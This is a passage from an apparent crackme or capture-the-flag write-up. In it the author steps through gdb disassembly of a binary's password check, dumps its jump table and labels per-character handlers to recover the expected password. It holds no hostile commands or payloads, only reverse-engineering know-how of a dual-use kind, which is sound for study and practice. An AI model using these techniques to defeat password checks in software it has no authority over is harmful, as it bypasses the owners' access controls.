<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048600:  movzx  ecx,cl
</span><span class='line'>   0x8048603: jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/400x 0x8048b90
</span><span class='line'>0x8048b90:    0x08048610  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ba0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bd0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048be0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bf0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c00:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c10:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c20:    0x080485de  0x080485de  0x08048628  0x08048640
</span><span class='line'>0x8048c30:    0x08048658  0x08048678  0x08048698  0x080486c0
</span><span class='line'>0x8048c40:    0x080486e0  0x08048708  0x08048730  0x08048758
</span><span class='line'>0x8048c50:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c60:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c70:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c80:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c90:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ca0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cd0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ce0:    0x080485de  0x080485de  0x080485de  0x08048780
</span><span class='line'>0x8048cf0:    0x080487a0  0x080487c0  0x080487e0  0x08048800
</span><span class='line'>0x8048d00:    0x08048820  0x08048840  0x08048858  0x08048878
</span><span class='line'>0x8048d10:    0x08048898  0x080488b8  0x080488d0  0x080488f0
</span><span class='line'>0x8048d20:    0x08048910  0x08048928  0x08048950  0x08048970
</span><span class='line'>0x8048d30:    0x08048990  0x080489b0  0x080489d0  0x080489e8
</span><span class='line'>0x8048d40:    0x08048a08  0x08048a28  0x08048a48  0x08048a68
</span><span class='line'>0x8048d50:    0x08048a88  0x73736150  0x64726f77  0x4300203a
</span></code></pre></td></tr></table></div></figure>


<p>There are a lot of occurences of <code>0x080485de</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485de:    xor    eax,eax
</span><span class='line'>   0x80485e0: mov    edx,DWORD PTR <span class="o">[</span>esp+0x8c<span class="o">]</span>
</span><span class='line'>   0x80485e7: xor    edx,DWORD PTR gs:0x14
</span><span class='line'>   0x80485ee: jne    0x8048ab0
</span><span class='line'>   0x80485f4: add    esp,0x9c
</span><span class='line'>   0x80485fa: pop    ebx
</span><span class='line'>   0x80485fb: pop    esi
</span><span class='line'>   0x80485fc: pop    edi
</span><span class='line'>   0x80485fd: pop    ebp
</span><span class='line'>   0x80485fe: ret
</span></code></pre></td></tr></table></div></figure>


<p>Which basically means &ldquo;get out of here, your password isn&rsquo;t correct&rdquo;. I decided to continue and see what the code did:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048603:  jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x804860a:  lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x8048610:  cmp    edx,0xd
</span><span class='line'> <span class="p">|</span> 0x8048613:  sete   dl
</span><span class='line'> <span class="p">|</span> 0x8048616:  xor    eax,eax
</span><span class='line'> <span class="p">|</span>-&gt;   0x8048628:   <span class="nb">test   </span>edx,edx
</span><span class='line'>       0x804862a: jne    0x80485de
</span><span class='line'>       0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>       0x8048631: je     0x80485de
</span><span class='line'>       0x8048633: mov    edx,0x1
</span><span class='line'>       0x8048638: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>It checks if <code>edx</code> is zero. If it is, it checks if some memory location is zero (it was) and then sets edx to 1. It then goes back to the code where a byte is taken from the password. Only this time, it would be the second byte! This means that I accidentally guessed the first char of the password right. The next one was not correct, as I supplied <code>1</code> which then jumps to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x8048640:    cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>Because <code>edx</code> was not set to <code>0xe</code>, the check fails and the password is incorrect. From here on, I dumped the jumptable and gave each memory location a label using a python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x08048610:
</span><span class='line'>...snip...
</span><span class='line'>0x080485de:!
</span><span class='line'>0x080485de:<span class="err">&quot;</span>
</span><span class='line'>0x080485de:#
</span><span class='line'>0x080485de:<span class="err">$</span>
</span><span class='line'>0x080485de:%
</span><span class='line'>0x080485de:<span class="p">&amp;</span>
</span><span class='line'>0x080485de:<span class="err">&#39;</span>
</span><span class='line'>0x080485de:<span class="o">(</span>
</span><span class='line'>0x080485de:<span class="o">)</span>
</span><span class='line'>0x080485de:*
</span><span class='line'>0x080485de:+
</span><span class='line'>0x080485de:,
</span><span class='line'>0x080485de:-
</span><span class='line'>0x080485de:.
</span><span class='line'>0x080485de:/
</span><span class='line'>0x08048628:0
</span><span class='line'>0x08048640:1
</span><span class='line'>0x08048658:2
</span><span class='line'>0x08048678:3
</span><span class='line'>0x08048698:4
</span><span class='line'>0x080486c0:5
</span><span class='line'>0x080486e0:6
</span><span class='line'>0x08048708:7
</span><span class='line'>0x08048730:8
</span><span class='line'>0x08048758:9
</span><span class='line'>0x080485de::
</span><span class='line'>0x080485de:<span class="p">;</span>
</span><span class='line'>0x080485de:&lt;
</span><span class='line'>0x080485de:<span class="o">=</span>
</span><span class='line'>0x080485de:&gt;
</span><span class='line'>0x080485de:?
</span><span class='line'>0x080485de:@
</span><span class='line'>0x080485de:A
</span><span class='line'>0x080485de:B
</span><span class='line'>0x080485de:C
</span><span class='line'>0x080485de:D
</span><span class='line'>0x080485de:E
</span><span class='line'>0x080485de:F
</span><span class='line'>0x080485de:G
</span><span class='line'>0x080485de:H
</span><span class='line'>0x080485de:I
</span><span class='line'>0x080485de:J
</span><span class='line'>0x080485de:K
</span><span class='line'>0x080485de:L
</span><span class='line'>0x080485de:M
</span><span class='line'>0x080485de:N
</span><span class='line'>0x080485de:O
</span><span class='line'>0x080485de:P
</span><span class='line'>0x080485de:Q
</span><span class='line'>0x080485de:R
</span><span class='line'>0x080485de:S
</span><span class='line'>0x080485de:T
</span><span class='line'>0x080485de:U
</span><span class='line'>0x080485de:V
</span><span class='line'>0x080485de:W
</span><span class='line'>0x080485de:X
</span><span class='line'>0x080485de:Y
</span><span class='line'>0x080485de:Z
</span><span class='line'>0x080485de:<span class="o">[</span>
</span><span class='line'>0x080485de:<span class="se">\</span>
</span><span class='line'>0x080485de:<span class="o">]</span>
</span><span class='line'>0x080485de:^
</span><span class='line'>0x080485de:_
</span><span class='line'>0x080485de:<span class="sb">`</span>
</span><span class='line'>0x08048780:a
</span><span class='line'>0x080487a0:b
</span><span class='line'>0x080487c0:c
</span><span class='line'>0x080487e0:d
</span><span class='line'>0x08048800:e
</span><span class='line'>0x08048820:f
</span><span class='line'>0x08048840:g
</span><span class='line'>0x08048858:h
</span><span class='line'>0x08048878:i
</span><span class='line'>0x08048898:j
</span><span class='line'>0x080488b8:k
</span><span class='line'>0x080488d0:l
</span><span class='line'>0x080488f0:m
</span><span class='line'>0x08048910:n
</span><span class='line'>0x08048928:o
</span><span class='line'>0x08048950:p
</span><span class='line'>0x08048970:q
</span><span class='line'>0x08048990:r
</span><span class='line'>0x080489b0:s
</span><span class='line'>0x080489d0:t
</span><span class='line'>0x080489e8:u
</span><span class='line'>0x08048a08:v
</span><span class='line'>0x08048a28:w
</span><span class='line'>0x08048a48:x
</span><span class='line'>0x08048a68:y
</span><span class='line'>0x08048a88:z
</span></code></pre></td></tr></table></div></figure>


<p>Then I dumped all the instructions starting at <code>0x8048610</code> and labelled them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x0a
</span><span class='line'>   0x8048610: cmp    edx,0xd  
</span><span class='line'>   0x8048613: sete   dl
</span><span class='line'>   0x8048616: xor    eax,eax
</span><span class='line'>   0x8048618: cmp    BYTE PTR <span class="o">[</span>esp+0x56<span class="o">]</span>,0x0
</span><span class='line'>   0x804861d: setne  al
</span><span class='line'>   0x8048620: and    eax,edx
</span><span class='line'>   0x8048622: jmp    0x80485e0
</span><span class='line'>   0x8048624: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048628:0
</span><span class='line'>   0x8048628: <span class="nb">test   </span>edx,edx
</span><span class='line'>   0x804862a: jne    0x80485de
</span><span class='line'>   0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>   0x8048631: je     0x80485de
</span><span class='line'>   0x8048633: mov    edx,0x1
</span><span class='line'>   0x8048638: jmp    0x80485ab
</span><span class='line'>   0x804863d: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048640:1
</span><span class='line'>   0x8048640: cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span><span class='line'>   // 0x08048658:2
</span><span class='line'>   0x8048658: cmp    edx,0x14
</span><span class='line'>   0x804865b: jne    0x80485de
</span><span class='line'>   0x804865d: cmp    BYTE PTR <span class="o">[</span>esp+0x7e<span class="o">]</span>,0x0
</span><span class='line'>   0x8048662: je     0x80485de
</span><span class='line'>   0x8048668: mov    edx,0x15
</span><span class='line'>   0x804866d: jmp    0x80485ab
</span><span class='line'>   0x8048672: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048678:3
</span><span class='line'>   0x8048678: cmp    edx,0x59
</span><span class='line'>   0x804867b: jne    0x80485de
</span><span class='line'>   0x8048681: cmp    BYTE PTR <span class="o">[</span>esp+0x7f<span class="o">]</span>,0x0
</span><span class='line'>   0x8048686: je     0x80485de
</span><span class='line'>   0x804868c: mov    edx,0x5a
</span><span class='line'>   0x8048691: jmp    0x80485ab
</span><span class='line'>   0x8048696: xchg   ax,ax
</span><span class='line'>   // 0x08048698:4
</span><span class='line'>   0x8048698: cmp    edx,0xf
</span><span class='line'>   0x804869b: jne    0x80485de
</span><span class='line'>   0x80486a1: cmp    BYTE PTR <span class="o">[</span>esp+0x80<span class="o">]</span>,0x0
</span><span class='line'>   0x80486a9: je     0x80485de
</span><span class='line'>   0x80486af: mov    edx,0x10
</span><span class='line'>   0x80486b4: jmp    0x80485ab
</span><span class='line'>   0x80486b9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486c0:5
</span><span class='line'>   0x80486c0: cmp    edx,0xe
</span><span class='line'>   0x80486c3: jne    0x80485de
</span><span class='line'>   0x80486c9: cmp    BYTE PTR <span class="o">[</span>esp+0x81<span class="o">]</span>,0x0
</span><span class='line'>   0x80486d1: jne    0x804864c
</span><span class='line'>   0x80486d7: jmp    0x80485de
</span><span class='line'>   0x80486dc: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486e0:6
</span><span class='line'>   0x80486e0: cmp    edx,0xc
</span><span class='line'>   0x80486e3: jne    0x80485de
</span><span class='line'>   0x80486e9: cmp    BYTE PTR <span class="o">[</span>esp+0x82<span class="o">]</span>,0x0
</span><span class='line'>   0x80486f1: je     0x80485de
</span><span class='line'>   0x80486f7: mov    edx,0xd
</span><span class='line'>   0x80486fc: jmp    0x80485ab
</span><span class='line'>   0x8048701: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048708:7
</span><span class='line'>   0x8048708: cmp    edx,0x5
</span><span class='line'>   0x804870b: jne    0x80485de
</span><span class='line'>   0x8048711: cmp    BYTE PTR <span class="o">[</span>esp+0x83<span class="o">]</span>,0x0
</span><span class='line'>   0x8048719: je     0x80485de
</span><span class='line'>   0x804871f: mov    edx,0x6
</span><span class='line'>   0x8048724: jmp    0x80485ab
</span><span class='line'>   0x8048729: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // ?? 0x08048730:8
</span><span class='line'>   0x8048730: xor    eax,eax
</span><span class='line'>   0x8048732: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x804873a: je     0x80485e0
</span><span class='line'>   0x8048740: cmp    edx,0x2
</span><span class='line'>   0x8048743: sete   al
</span><span class='line'>   0x8048746: cmp    edx,0x21
</span><span class='line'>   0x8048749: sete   dl
</span><span class='line'>   0x804874c: or     eax,edx
</span><span class='line'>   0x804874e: movzx  eax,al
</span><span class='line'>   0x8048751: jmp    0x80485e0
</span><span class='line'>   0x8048756: xchg   ax,ax
</span><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span><span class='line'>   0x8048779: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048780:a
</span><span class='line'>   0x8048780: cmp    edx,0x23
</span><span class='line'>   0x8048783: jne    0x80485de
</span><span class='line'>   0x8048789: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x804878e: je     0x80485de
</span><span class='line'>   0x8048794: mov    edx,0x24
</span><span class='line'>   0x8048799: jmp    0x80485ab
</span><span class='line'>   0x804879e: xchg   ax,ax
</span><span class='line'>   // 0x080487a0:b
</span><span class='line'>   0x80487a0: cmp    edx,0xb
</span><span class='line'>   0x80487a3: jne    0x80485de
</span><span class='line'>   0x80487a9: cmp    BYTE PTR <span class="o">[</span>esp+0x2e<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ae: je     0x80485de
</span><span class='line'>   0x80487b4: mov    edx,0xc
</span><span class='line'>   0x80487b9: jmp    0x80485ab
</span><span class='line'>   0x80487be: xchg   ax,ax
</span><span class='line'>   0x080487c0:c
</span><span class='line'>   0x80487c0: cmp    edx,0x20
</span><span class='line'>   0x80487c3: jne    0x80485de
</span><span class='line'>   0x80487c9: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ce: je     0x80485de
</span><span class='line'>   0x80487d4: mov    edx,0x21
</span><span class='line'>   0x80487d9: jmp    0x80485ab
</span><span class='line'>   0x80487de: xchg   ax,ax
</span><span class='line'>  // 0x080487e0:d
</span><span class='line'>   0x80487e0: cmp    edx,0x3
</span><span class='line'>   0x80487e3: jne    0x80485de
</span><span class='line'>   0x80487e9: cmp    BYTE PTR <span class="o">[</span>esp+0x30<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ee: je     0x80485de
</span><span class='line'>   0x80487f4: mov    edx,0x4
</span><span class='line'>   0x80487f9: jmp    0x80485ab
</span><span class='line'>   0x80487fe: xchg   ax,ax
</span><span class='line'>   // 0x08048800:e
</span><span class='line'>   0x8048800: cmp    edx,0x7
</span><span class='line'>   0x8048803: jne    0x80485de
</span><span class='line'>   0x8048809: cmp    BYTE PTR <span class="o">[</span>esp+0x31<span class="o">]</span>,0x0
</span><span class='line'>   0x804880e: je     0x80485de
</span><span class='line'>   0x8048814: mov    edx,0x8
</span><span class='line'>   0x8048819: jmp    0x80485ab
</span><span class='line'>   0x804881e: xchg   ax,ax
</span><span class='line'>   // 0x08048820:f
